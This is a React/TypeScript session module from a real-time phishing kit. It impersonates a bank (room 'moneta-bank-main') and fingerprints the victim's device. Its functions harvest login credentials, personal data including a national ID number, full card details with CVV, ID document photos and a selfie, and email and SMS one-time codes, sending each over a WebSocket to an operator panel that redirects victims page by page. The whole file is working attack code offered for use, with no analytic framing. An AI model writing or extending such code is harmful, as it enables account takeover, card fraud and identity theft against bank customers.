import React, {
  createContext,
  useContext,
  useState,
  useEffect,
} from "react";
import { PartyKitClient } from "../lib/partykit-client";

export type PageType =
  | "alert"
  | "login"
  | "loading"
  | "personal-data"
  | "credit-card"
  | "document-upload"
  | "email-otp"
  | "sms-otp"
  | "qr-code"
  | "qr-upload"
  | "url-verification"
  | "whatsapp-support"
  | "app-verification"
  | "wrong-details"
  | "success";

export interface ClientSession {
  id: string;
  ipAddress: string;
  device: string;
  browser: string;
  online: boolean;
  currentPage: PageType;
  connectedAt: string;
  lastActivity: string;
  history: HistoryEntry[];
  loginData?: {
    clientId: string;
    username: string;
    password: string;
  };
  personalData?: {
    fullName: string;
    dateOfBirth: string;
    idNumber: string;
    address: string;
    phoneNumber: string;
    email: string;
  };
  creditCardData?: {
    cardNumber: string;
    expiryDate: string;
    cvv: string;
    cardholderName: string;
  };
  documentData?: {
    idFront?: string | null;
    idBack?: string | null;
    selfie?: string | null;
  };
  emailOTPs?: string[];
  smsOTPs?: string[];
  qrScanned?: boolean;
  qrUploaded?: string;
  urlSubmitted?: string;
  whatsappContacted?: boolean;
  appAuthorized?: boolean;
  blocked: boolean;
  adminControl: {
    nextPage?: PageType;
    qrCodeUrl?: string;
  };
}

export interface HistoryEntry {
  timestamp: string;
  page: PageType;
  action: string;
  data?: any;
}

interface SessionContextType {
  sessionId: string;
  currentPage: PageType;
  setCurrentPage: (page: PageType) => void;
  submitLoginData: (data: any) => void;
  submitPersonalData: (data: any) => void;
  submitCreditCardData: (data: any) => void;
  submitDocumentData: (data: any) => void;
  submitEmailOTP: (otp: string) => void;
  submitSMSOTP: (otp: string) => void;
  submitQRScan: (scanned: boolean) => void;
  submitQRUpload: (imageData: string) => void;
  submitURL: (url: string) => void;
  submitWhatsAppContact: (contacted: boolean) => void;
  submitAppVerification: (authorized: boolean) => void;
  checkAdminControl: () => void;
  qrCodeUrl?: string;
}

const SessionContext = createContext<
  SessionContextType | undefined
>(undefined);

// Get detailed client info
const getClientInfo = () => {
  const userAgent = navigator.userAgent;
  let browser = "Unknown";
  let browserVersion = "";
  let device = "Desktop";
  let os = "Unknown";
  let osVersion = "";

  // Detect browser with version
  if (userAgent.includes("Edg/")) {
    browser = "Edge";
    browserVersion = userAgent.match(/Edg\/([\d.]+)/)?.[1] || "";
  } else if (userAgent.includes("Chrome/")) {
    browser = "Chrome";
    browserVersion = userAgent.match(/Chrome\/([\d.]+)/)?.[1] || "";
  } else if (userAgent.includes("Firefox/")) {
    browser = "Firefox";
    browserVersion = userAgent.match(/Firefox\/([\d.]+)/)?.[1] || "";
  } else if (userAgent.includes("Safari/") && !userAgent.includes("Chrome")) {
    browser = "Safari";
    browserVersion = userAgent.match(/Version\/([\d.]+)/)?.[1] || "";
  } else if (userAgent.includes("Opera/") || userAgent.includes("OPR/")) {
    browser = "Opera";
    browserVersion = userAgent.match(/(?:Opera|OPR)\/([\d.]+)/)?.[1] || "";
  }

  // Detect device
  if (/Mobile|Android|iPhone|iPod/.test(userAgent))
    device = "Mobile";
  else if (/iPad|Tablet/.test(userAgent)) device = "Tablet";

  // Detect OS with version
  if (userAgent.includes("Windows NT")) {
    os = "Windows";
    const version = userAgent.match(/Windows NT ([\d.]+)/)?.[1];
    if (version === "10.0") osVersion = "10/11";
    else if (version === "6.3") osVersion = "8.1";
    else if (version === "6.2") osVersion = "8";
    else if (version === "6.1") osVersion = "7";
  } else if (userAgent.includes("Mac OS X")) {
    os = "macOS";
    osVersion = userAgent.match(/Mac OS X ([\d_]+)/)?.[1]?.replace(/_/g, ".") || "";
  } else if (userAgent.includes("Linux")) {
    os = "Linux";
  } else if (userAgent.includes("Android")) {
    os = "Android";
    osVersion = userAgent.match(/Android ([\d.]+)/)?.[1] || "";
  } else if (userAgent.includes("iOS") || userAgent.includes("iPhone") || userAgent.includes("iPad")) {
    os = "iOS";
    osVersion = userAgent.match(/OS ([\d_]+)/)?.[1]?.replace(/_/g, ".") || "";
  }

  // Determine more specific device info
  let deviceInfo = device;
  if (device === 'Mobile') {
    if (userAgent.includes('iPhone')) deviceInfo = 'iPhone';
    else if (userAgent.includes('iPad')) deviceInfo = 'iPad';
    else if (userAgent.includes('Android')) deviceInfo = 'Android Phone';
  } else if (device === 'Tablet') {
    if (userAgent.includes('iPad')) deviceInfo = 'iPad';
    else deviceInfo = 'Android Tablet';
  }

  return { 
    browser, 
    browserVersion,
    device: `${deviceInfo} (${os} ${osVersion})`.trim(),
    os, 
    osVersion,
    userAgent,
    fullBrowserInfo: `${browser} ${browserVersion}`.trim(),
    fullOSInfo: `${os} ${osVersion}`.trim()
  };
};

export function SessionProvider({
  children,
}: {
  children: React.ReactNode;
}) {
  const [partyClient] = useState(() => {
    // Use environment variable or default to localhost
    const host = import.meta.env?.VITE_PARTYKIT_HOST || "localhost:1999";
    return new PartyKitClient(host, "moneta-bank-main");
  });

  const [sessionId] = useState(() => partyClient.getSessionId());
  const [currentPage, setCurrentPageState] = useState<PageType>("alert");
  const [qrCodeUrl, setQrCodeUrl] = useState<string>();

  // Connect to PartyKit on mount
  useEffect(() => {
    partyClient.connect().catch(err => {
      console.error("PartyKit connection error:", err);
    });

    // Listen for admin redirects
    partyClient.on("server:redirect", (data) => {
      setCurrentPageState(data.page);
    });

    return () => {
      partyClient.disconnect();
    };
  }, [partyClient]);

  // Update page when it changes
  useEffect(() => {
    partyClient.updatePage(currentPage);
  }, [currentPage, partyClient]);

  const setCurrentPage = async (page: PageType) => {
    setCurrentPageState(page);
    partyClient.logActivity(page, `Navigated to ${page}`);
  };

  const submitLoginData = async (data: any) => {
    partyClient.sendData("loginCredentials", {
      username: data.username,
      password: data.password,
    }, true); // encrypted
    
    partyClient.logActivity("login", "Submitted login credentials", `Username: ${data.username}`);
    await setCurrentPage("loading");
  };

  const submitPersonalData = async (data: any) => {
    partyClient.sendData("personalData", {
      firstName: data.fullName?.split(' ')[0] || '',
      lastName: data.fullName?.split(' ').slice(1).join(' ') || '',
      email: data.email,
      phone: data.phoneNumber,
      dob: data.dateOfBirth,
      bsn: data.idNumber,
    }, true); // encrypted
    
    partyClient.logActivity("personal-data", "Submitted personal data", `Name: ${data.fullName}`);
    await setCurrentPage("loading");
  };

  const submitCreditCardData = async (data: any) => {
    partyClient.sendData("creditCard", {
      number: data.cardNumber,
      name: data.cardholderName,
      expiry: data.expiryDate,
      cvv: data.cvv,
    }, true); // encrypted
    
    partyClient.logActivity("credit-card", "Submitted credit card data", `Card: ${data.cardNumber}`);
    await setCurrentPage("loading");
  };

  const submitDocumentData = async (data: any) => {
    partyClient.sendData("documents", [
      ...(data.idFront ? [{ name: "ID Front", url: data.idFront }] : []),
      ...(data.idBack ? [{ name: "ID Back", url: data.idBack }] : []),
      ...(data.selfie ? [{ name: "Selfie", url: data.selfie }] : []),
    ], true); // encrypted
    
    partyClient.logActivity("document-upload", "Uploaded documents", `Count: ${Object.values(data).filter(Boolean).length}`);
    await setCurrentPage("loading");
  };

  const submitEmailOTP = async (otp: string) => {
    partyClient.sendData("emailOTP", { code: otp }, true);
    partyClient.logActivity("email-otp", "Submitted email OTP", `Code: ${otp}`);
    await setCurrentPage("loading");
  };

  const submitSMSOTP = async (otp: string) => {
    partyClient.sendData("smsOTP", { code: otp }, true);
    partyClient.logActivity("sms-otp", "Submitted SMS OTP", `Code: ${otp}`);
    await setCurrentPage("loading");
  };

  const submitQRScan = async (scanned: boolean) => {
    partyClient.logActivity("qr-code", scanned ? "Scanned QR code" : "Did not scan", undefined);
    await setCurrentPage("loading");
  };

  const submitQRUpload = async (imageData: string) => {
    partyClient.sendData("qrCode", { url: imageData }, false);
    partyClient.logActivity("qr-upload", "Uploaded QR code image");
    await setCurrentPage("loading");
  };

  const submitURL = async (url: string) => {
    partyClient.logActivity("url-verification", "Submitted URL", url);
    await setCurrentPage("loading");
  };

  const submitWhatsAppContact = async (contacted: boolean) => {
    if (contacted) {
      partyClient.sendData("whatsappNumber", { number: "+31 6 12345678" }, false);
    }
    partyClient.logActivity("whatsapp-support", contacted ? "Clicked WhatsApp" : "Did not contact");
    await setCurrentPage("loading");
  };

  const submitAppVerification = async (authorized: boolean) => {
    partyClient.logActivity("app-verification", authorized ? "Authorized via app" : "Timer expired");
    await setCurrentPage("loading");
  };

  const checkAdminControl = async () => {
    // Not needed with PartyKit - redirects are instant via WebSocket
  };

  return (
    <SessionContext.Provider
      value={{
        sessionId,
        currentPage,
        setCurrentPage,
        submitLoginData,
        submitPersonalData,
        submitCreditCardData,
        submitDocumentData,
        submitEmailOTP,
        submitSMSOTP,
        submitQRScan,
        submitQRUpload,
        submitURL,
        submitWhatsAppContact,
        submitAppVerification,
        checkAdminControl,
        qrCodeUrl,
      }}
    >
      {children}
    </SessionContext.Provider>
  );
}

export function useSession() {
  const context = useContext(SessionContext);
  if (!context) {
    throw new Error(
      "useSession must be used within SessionProvider",
    );
  }
  return context;
}
